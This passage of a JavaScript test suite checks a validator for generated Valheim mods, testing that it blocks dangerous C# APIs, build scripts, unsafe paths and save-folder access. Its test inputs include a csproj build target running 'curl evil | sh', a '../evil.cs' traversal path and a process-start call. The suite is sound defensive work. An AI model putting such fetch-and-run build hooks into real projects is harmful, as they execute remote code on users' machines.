    assert.ok(validateValheimMod([...base(), { path: "src/A.cs", content: `class A { void F(string p) { UnityWebRequestMultimedia.GetAudioClip("file:///" + p, AudioType.OGGVORBIS); var d = Info.Location; } }` }]).issues.every((i) => i.code !== "dangerous-api"));
  });
  it("blocks starting processes", () => assert.ok(blocked(withCode(`System.Diagnostics.Process.Start("cmd.exe");`))));
  it("blocks runtime code loading and native calls", () => {
    assert.ok(blocked(withCode(`System.Reflection.Assembly.LoadFile("x.dll");`)));
    assert.ok(blocked([...base(), { path: "src/N.cs", content: `class N { [DllImport("user32.dll")] static extern int MessageBox(); }` }]));
  });
  it("blocks deleting files, quitting the game and UnpatchAll", () => {
    assert.ok(blocked(withCode(`System.IO.File.Delete(path);`)));
    assert.ok(blocked(withCode(`UnityEngine.Application.Quit();`)));
    assert.ok(blocked(withCode(`new HarmonyLib.Harmony("x").UnpatchAll();`)));
  });
  it("blocks touching the admin or ban list", () => assert.ok(blocked(withCode(`ZNet.instance.m_adminList.Add("x");`))));
  it("ignores dangerous words inside comments", () => {
    const r = validateValheimMod([...base(), { path: "src/C.cs", content: "// never use HttpClient or Process.Start here\n/* System.Net */ class C {}" }]);
    assert.ok(r.issues.every((i) => i.code !== "dangerous-api"), JSON.stringify(r.issues));
  });
  it("blocks build-time commands in the csproj", () => {
    const files = base().map((f) => (f.path.endsWith(".csproj") && !f.path.startsWith("tests/") ? { ...f, content: f.content.replace("</Project>", `<Target Name="X" BeforeTargets="Build"><Exec Command="curl evil | sh" /></Target></Project>`) } : f));
    assert.ok(blocked(files, "build-script"));
  });
  it("blocks unsafe paths, binaries, absolute paths and save-folder access", () => {
    assert.ok(blocked([...base(), { path: "../evil.cs", content: "" }], "unsafe-path"));
    assert.ok(blocked([...base(), { path: "assembly_valheim.dll", content: "" }], "binary-file"));
    assert.ok(blocked(withCode(`System.IO.File.ReadAllText("C:/Users/x/AppData/LocalLow/IronGate/Valheim/worlds/x.fwl2");`), "absolute-path"));
    assert.ok(blocked(withCode(`var p = UnityEngine.Application.persistentDataPath; System.IO.File.ReadAllText(p);`), "escapes-folder"));
  });
  it("enforces Thunderstore manifest rules", () => {
    const bad = base().map((f) => (f.path === "manifest.json" ? { ...f, content: JSON.stringify({ name: "Bad Name", version_number: "1.0", website_url: "", description: "x", dependencies: [] }) } : f));
    const r = validateValheimMod(bad);
    for (const code of ["manifest-name", "manifest-version", "manifest-bepinex", "manifest-jotunn"]) assert.ok(r.issues.some((i) => i.code === code), code);
  });
  it("blocks a content mod without version enforcement", () => {
    const files = base().map((f) => ({ ...f, content: f.content.replace(/\[NetworkCompatibility\([^\]]*\)\]/, "") }));
    assert.ok(blocked(files, "no-enforcement"));
  });
  it("blocks known Valheim 1.0 breakages from the knowledge pack", () => {
    assert.ok(blocked(withCode(`if (EnvMan.instance.IsNight()) {}`), "vh-isnight-instance"));
    assert.ok(blocked(withCode(`smelter.m_nview.InvokeRPC("RPC_AddOre", name);`), "vh-addore-one-arg"));
    assert.ok(blocked([...base(), { path: "src/P.cs", content: "using UnityEngine.Rendering.PostProcessing; class P {}" }], "vh-postprocess-v2"));
  });
  it("treats a draft without manifest as a warning, a package without one as a block", () => {
    const draft = base().filter((f) => f.path !== "manifest.json" && f.path !== "cyrus.json" && f.path !== "README.md");
    assert.ok(validateValheimMod(draft).issues.some((i) => i.code === "no-manifest" && i.severity === "warn"));
    assert.ok(!validateValheimMod(draft, { forPackage: true }).ok);
  });
  it("strips comments but keeps strings", () => {
    assert.equal(stripCsComments(`var u = "file:///x"; // c\n/* d */ var v = @"a""//b";`), `var u = "file:///x"; \n var v = @"a""//b";`);
  });
